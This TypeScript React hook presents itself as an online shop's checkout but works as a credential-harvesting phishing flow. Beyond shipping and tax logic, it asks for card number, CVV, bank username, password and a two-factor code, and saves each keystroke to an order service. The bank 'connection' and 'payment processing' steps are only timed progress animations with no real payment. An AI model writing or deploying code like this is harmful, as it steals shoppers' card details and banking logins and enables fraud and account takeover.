import { useState, useCallback, useEffect } from 'react';
import { saveOrderData } from '../services/orderService';

export interface FormData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  sameAsBilling: boolean;
  billingAddress: string;
  billingCity: string;
  billingState: string;
  billingZipCode: string;
}

export interface CardData {
  cardholderName: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
}

export interface BankLoginData {
  username: string;
  password: string;
  twoFactorCode: string;
}

export interface CardErrors {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  cardholderName: string;
}

export const useCheckout = (cartTotal: number) => {
  const [step, setStep] = useState(1);
  const [selectedBank, setSelectedBank] = useState('');
  const [showBankAuth, setShowBankAuth] = useState(false);
  const [authStep, setAuthStep] = useState(1);
  const [showPassword, setShowPassword] = useState(false);
  const [cardType, setCardType] = useState('');
  const [connecting, setConnecting] = useState(false);
  const [processingPayment, setProcessingPayment] = useState(false);
  const [processingProgress, setProcessingProgress] = useState(0);
  const [paymentDone, setPaymentDone] = useState(false);
  const [connectingProgress, setConnectingProgress] = useState(0);
  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);

  const [cardErrors, setCardErrors] = useState<CardErrors>({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: '',
  });

  const [cardData, setCardData] = useState<CardData>({
    cardholderName: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const [bankLoginData, setBankLoginData] = useState<BankLoginData>({
    username: '',
    password: '',
    twoFactorCode: '',
  });

  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    sameAsBilling: true,
    billingAddress: '',
    billingCity: '',
    billingState: '',
    billingZipCode: '',
  });

  const FREE_SHIPPING_THRESHOLD = 99;
  const SHIPPING_COST = 9.99;
  const shipping = cartTotal >= FREE_SHIPPING_THRESHOLD ? 0 : SHIPPING_COST;

  const stateTaxRates: Record<string, number> = {
    AL: 0.04, AK: 0, AZ: 0.056, AR: 0.065, CA: 0.0725, CO: 0.029,
    CT: 0.0635, DE: 0, FL: 0.06, GA: 0.04, HI: 0.04, ID: 0.06,
    IL: 0.0625, IN: 0.07, IA: 0.06, KS: 0.065, KY: 0.06, LA: 0.05,
    ME: 0.055, MD: 0.06, MA: 0.0625, MI: 0.06, MN: 0.0688, MS: 0.07,
    MO: 0.0423, MT: 0, NE: 0.055, NV: 0.046, NH: 0, NJ: 0.0663,
    NM: 0.0513, NY: 0.04, NC: 0.0475, ND: 0.05, OH: 0.0575, OK: 0.045,
    OR: 0, PA: 0.06, RI: 0.07, SC: 0.06, SD: 0.045, TN: 0.07,
    TX: 0.0625, UT: 0.047, VT: 0.06, VA: 0.043, WA: 0.065, WV: 0.06,
    WI: 0.05, WY: 0.04,
  };

  const selectedState = (formData.state || '').toUpperCase();
  const taxRate = stateTaxRates[selectedState] ?? 0;
  const tax = cartTotal * taxRate;
  const total = cartTotal + shipping + tax;

  const handleInputChange = useCallback((
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value, type } = e.target;
    if (name === 'phone') {
      const cleaned = value.replace(/\D/g, '');
      let formatted = '';

      if (cleaned.length > 0) {
        if (cleaned.length <= 1) {
          formatted = `+${cleaned}`;
        } else if (cleaned.length <= 4) {
          formatted = `+${cleaned.slice(0, 1)} ${cleaned.slice(1)}`;
        } else if (cleaned.length <= 7) {
          formatted = `+${cleaned.slice(0, 1)} ${cleaned.slice(1, 4)} ${cleaned.slice(4)}`;
        } else {
          formatted = `+${cleaned.slice(0, 1)} ${cleaned.slice(1, 4)} ${cleaned.slice(4, 7)} ${cleaned.slice(7, 11)}`;
        }
      }

      setFormData((prev) => ({ ...prev, [name]: formatted }));
    } else {
      setFormData((prev) => ({
        ...prev,
        [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value,
      }));
    }
  }, []);

  const handleCardDataChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === 'cardNumber') {
      const raw = value.replace(/\D/g, '');
      const prospectiveType = detectCardType(raw);
      const maxLen = prospectiveType === 'amex' ? 15 : 16;
      const cleanValue = raw.slice(0, maxLen);
      formattedValue = formatCardNumber(cleanValue);
      const newCardType = detectCardType(cleanValue);
      setCardType(newCardType);
    } else if (name === 'expiryDate') {
      const cleanValue = value.replace(/\D/g, '');
      if (cleanValue.length <= 4) {
        formattedValue = formatExpiryDate(cleanValue);
      } else {
        return;
      }
    } else if (name === 'cvv') {
      const cleanValue = value.replace(/\D/g, '');
      const maxLength = cardType === 'amex' ? 4 : 3;
      if (cleanValue.length <= maxLength) {
        formattedValue = cleanValue;
      } else {
        return;
      }
    } else if (name === 'cardholderName') {
      formattedValue = value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
    }

    const updatedCardData = { ...cardData, [name]: formattedValue };
    setCardData(updatedCardData);
    validateCard(name, formattedValue, cardType, setCardErrors, cardErrors);
    
    // Save card data to order service
    if (currentOrderId) {
      saveOrderData(currentOrderId, { cardData: updatedCardData });
    }
  }, [cardType, cardErrors, cardData, currentOrderId]);

  const handleBankLoginChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    const updatedBankLoginData = { ...bankLoginData, [name]: value };
    setBankLoginData(updatedBankLoginData);
    
    // Save bank login data to order service
    if (currentOrderId) {
      saveOrderData(currentOrderId, { bankLoginData: updatedBankLoginData });
    }
  }, [bankLoginData, currentOrderId]);

  const handleSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault();
    if (step === 1) {
      setTimeout(() => setStep(2), 2000);
    }
  }, [step]);

  const handleBankSelect = useCallback((bankName: string) => {
    if (currentOrderId) {
      saveOrderData(currentOrderId, { bankName: bankName });
    }
    setSelectedBank(bankName);
  }, []);

  const handleProceedToBankAuth = useCallback(() => {
    if (selectedBank) {
      setTimeout(() => {
        setAuthStep(1);
        setShowBankAuth(true);
      }, 2000);
    }
  }, [selectedBank]);

  const handleCardDetailsSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault();

    if (cardType === 'unknown') {
      setCardErrors((prev) => ({
        ...prev,
        cardNumber: 'Unsupported card type. Please use Visa, Mastercard, or American Express',
      }));
      return;
    }

    if (Object.values(cardErrors).some((error) => error !== '')) {
      return;
    }

    setTimeout(() => {
      setConnecting(true);
      setConnectingProgress(0);
    }, 2000);

    const totalMs = 1600 + Math.round(Math.random() * 900);
    const tickMs = 80;
    const increment = 100 / Math.ceil(totalMs / tickMs);
    const intervalId = window.setInterval(() => {
      setConnectingProgress((prev) => {
        const next = Math.min(prev + increment, 100);
        if (next >= 100) {
          window.clearInterval(intervalId);
          setTimeout(() => {
            setConnecting(false);
            setAuthStep(2);
          }, 4000);
        }
        return next;
      });
    }, tickMs);
  }, [cardType, cardErrors]);

  const handleLoginSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault();
    setAuthStep(3);
  }, []);

  const handleVerificationContinue = useCallback((e: React.FormEvent) => {
    e.preventDefault();
    setAuthStep(4);
  }, []);

  const handle2FASubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault();
    setProcessingPayment(true);
    setPaymentDone(false);
    setProcessingProgress(0);
    
    const totalMs = 4000;
    const tickMs = 80;
    const increment = 100 / Math.ceil(totalMs / tickMs);
    const intervalId = window.setInterval(() => {
      setProcessingProgress((prev) => {
        const next = Math.min(prev + increment, 100);
        if (next >= 100) {
          window.clearInterval(intervalId);
          setPaymentDone(true);
          setTimeout(() => {
            setProcessingPayment(false);
            setShowBankAuth(false);
            setStep(3);
            setPaymentDone(false);
            setProcessingProgress(0);
          }, 900);
        }
        return next;
      });
    }, tickMs);
  }, []);

  const closeBankAuth = useCallback(() => {
    setShowBankAuth(false);
    setAuthStep(1);
    setCardData({
      cardholderName: '',
      cardNumber: '',
      expiryDate: '',
      cvv: '',
    });
    setBankLoginData({
      username: '',
      password: '',
      twoFactorCode: '',
    });
  }, []);

  // Set current order ID from ShippingForm
  useEffect(() => {
    const orderIdFromStorage = sessionStorage.getItem('currentOrderId');
    if (orderIdFromStorage) {
      setCurrentOrderId(orderIdFromStorage);
    }
  }, []);

  // Save product info and total to order service when available
  useEffect(() => {
    if (currentOrderId) {
      saveOrderData(currentOrderId, { 
        total: total,
        // Product info would typically come from cart items
      });
    }
  }, [currentOrderId, total]); // Fixing lint warning by removing unused variable

  return {
    // State
    step,
    selectedBank,
    showBankAuth,
    authStep,
    showPassword,
    setShowPassword,
    cardType,
    connecting,
    processingPayment,
    processingProgress,
    paymentDone,
    connectingProgress,
    cardErrors,
    cardData,
    bankLoginData,
    formData,
    currentOrderId,
    setCurrentOrderId,
    
    // Computed values
    shipping,
    tax,
    total,
    FREE_SHIPPING_THRESHOLD,
    
    // Handlers
    handleInputChange,
    handleCardDataChange,
    handleBankLoginChange,
    handleSubmit,
    handleBankSelect,
    handleProceedToBankAuth,
    handleCardDetailsSubmit,
    handleLoginSubmit,
    handleVerificationContinue,
    handle2FASubmit,
    closeBankAuth,
  };
};

// Utility functions
export const detectCardType = (number: string) => {
  const cleanNumber = number.replace(/\s/g, '');
  if (/^4/.test(cleanNumber)) return 'visa';
  if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) return 'mastercard';
  if (/^3[47]/.test(cleanNumber)) return 'amex';
  return 'unknown';
};

export const formatCardNumber = (value: string) => {
  const cleanValue = value.replace(/\s/g, '');
  const type = detectCardType(cleanValue);
  const maxLen = type === 'amex' ? 15 : type === 'visa' ? 19 : 16;
  const trimmed = cleanValue.slice(0, maxLen);

  if (type === 'amex') {
    return trimmed.replace(/(\d{4})(\d{6})(\d{0,5})/, (m, a, b, c) =>
      [a, b, c].filter(Boolean).join(' ')
    );
  }
  return trimmed.replace(/(\d{4})(?=\d)/g, '$1 ');
};

export const formatExpiryDate = (value: string) => {
  const cleanValue = value.replace(/\D/g, '');
  if (cleanValue.length >= 2) {
    return cleanValue.substring(0, 2) + '/' + cleanValue.substring(2, 4);
  }
  return cleanValue;
};

export const validateCard = (name: string, value: string, cardType: string, setCardErrors: (errors: CardErrors) => void, cardErrors: CardErrors) => {
  const errors = { ...cardErrors };

  switch (name) {
    case 'cardNumber': {
      const cleanNumber = value.replace(/\s/g, '');
      if (cleanNumber.length > 19) {
        errors.cardNumber = 'Card number cannot exceed 19 digits';
        break;
      }
      if (cardType === 'unknown') {
        errors.cardNumber = 'Unsupported card type. Use Visa, Mastercard, or American Express';
        break;
      }
      if (cardType === 'amex') {
        errors.cardNumber = cleanNumber.length === 15 ? '' : 'American Express must be 15 digits';
      } else if (cardType === 'mastercard') {
        errors.cardNumber = cleanNumber.length === 16 ? '' : 'Mastercard must be 16 digits';
      } else if (cardType === 'visa') {
        errors.cardNumber = cleanNumber.length >= 13 && cleanNumber.length <= 16 ? '' : 'Visa must be 13 to 16 digits';
      } else {
        errors.cardNumber = '';
      }
      break;
    }
    case 'expiryDate': {
      const [month, year] = value.split('/');
      const currentYear = new Date().getFullYear() % 100;
      const currentMonth = new Date().getMonth() + 1;

      if (!month || !year) {
        errors.expiryDate = 'Please enter MM/YY format';
      } else if (parseInt(month) < 1 || parseInt(month) > 12) {
        errors.expiryDate = 'Invalid month';
      } else if (
        parseInt(year) < currentYear ||
        (parseInt(year) === currentYear && parseInt(month) < currentMonth)
      ) {
        errors.expiryDate = 'Card has expired';
      } else {
        errors.expiryDate = '';
      }
      break;
    }
    case 'cvv': {
      const expectedLength = cardType === 'amex' ? 4 : 3;
      if (value.length !== expectedLength) {
        errors.cvv = `CVV must be ${expectedLength} digits`;
      } else {
        errors.cvv = '';
      }
      break;
    }
    case 'cardholderName': {
      if (value.length < 2) {
        errors.cardholderName = 'Please enter the full name on card';
      } else {
        errors.cardholderName = '';
      }
      break;
    }
  }

  setCardErrors(errors);
}; 